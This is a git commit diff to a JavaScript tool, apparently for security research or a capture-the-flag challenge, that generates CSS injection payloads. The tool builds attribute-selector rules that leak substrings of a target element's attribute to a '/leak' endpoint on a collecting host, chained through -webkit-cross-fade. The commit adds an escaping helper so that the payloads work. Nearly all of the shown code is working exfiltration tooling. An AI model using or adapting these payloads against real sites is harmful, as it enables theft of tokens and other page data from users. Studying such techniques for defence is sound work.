0e5684a800c747d4ce169004d63cc02cf8a2f7bd
Pocas <pocas.cyber@gmail.com>
2024-04-03 00:15:22 +0900

    add escapeCharacters() function

--- gen-ex-cssi.js
+++ gen-ex-cssi.js
@@ -1,8 +1,8 @@
 const fs = require('fs')
 const host = 'http://localhost:3333'
 const charset = 'abcdefghijklmnopqrstuvwxyz0123456789-'
-const target_tag = 'img' // you have to change into  your stuff
-const target_attr = 'src' // you have to change into  your stuff
+const target_tag = 'img' // you have to change into your stuff
+const target_attr = 'src' // you have to change into your stuff
 
 let gadgets = [] // 사용할 문자 가젯 생성
 for (let a of charset) {
@@ -17,13 +17,19 @@ for (let a of charset) {
 const third = Math.floor(gadgets.length / 3)
 const [gadgets1, gadgets2, gadgets3] = [gadgets.slice(0, third), gadgets.slice(third, 2 * third), gadgets.slice(2 * third)]
 
+function escapeCharacters(str) {
+    str = str.replace(/\./g, '\\.');
+    str = str.replace(/\//g, '\\/')
+    return str;
+}
+
 function generatePayload(gadgets) {
     let payload = ''
     let crossPayload = 'url("/")'
 
     for (let str of gadgets) {
-        payload += `${target_tag}[${target_attr}*="${str}"] {--${str}: url("${host}/leak?q=${str}")}\n`
-        crossPayload = `-webkit-cross-fade(${crossPayload}, var(--${str}, none), 50%)`
+        payload += `${target_tag}[${target_attr}*="${str}"] {--${escapeCharacters(str)}: url("${host}/leak?q=${str}")}\n`
+        crossPayload = `-webkit-cross-fade(${crossPayload}, var(--${escapeCharacters(str)}, none), 50%)`
     }
 
     return { payload, crossPayload }
